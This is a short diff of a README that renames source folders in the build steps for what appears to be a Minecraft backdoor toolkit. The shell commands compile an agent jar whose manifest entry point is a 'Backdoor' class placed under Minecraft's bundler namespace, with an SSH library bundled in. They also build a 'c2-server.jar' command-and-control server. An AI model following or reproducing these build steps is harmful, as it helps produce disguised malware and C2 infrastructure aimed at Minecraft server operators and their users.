@@ -41,7 +41,7 @@ Run this from the root of the repository
 ```bash
 rm -rf build-manual
 mkdir build-manual
-find minegriefagent -name '*.java' > sources.txt
+find agent -name '*.java' > sources.txt
 <JAVA 1.8 DIR>/bin/javac -d build-manual @sources.txt
 cp -r com/jcraft build-manual/com
 echo 'Manifest-Version: 1.0\nMain-Class: net.minecraft.bundler.Backdoor\nBundler-Format: 1.0' > manifest.txt
@@ -58,7 +58,7 @@ Run this from the root of the repository
 ```bash
 rm -rf build-manual
 mkdir build-manual
-find minegriefserver -name '*.java' > sources.txt
+find server -name '*.java' > sources.txt
 <JAVA 1.8 DIR>/bin/javac -d build-manual @sources.txt
 echo 'Manifest-Version: 1.0\nMain-Class: com.chebuya.minegriefserver.Main\nBundler-Format: 1.0' > manifest.txt
 <JAVA 1.8 DIR>/bin/jar cvfm c2-server.jar manifest.txt -C build-manual .
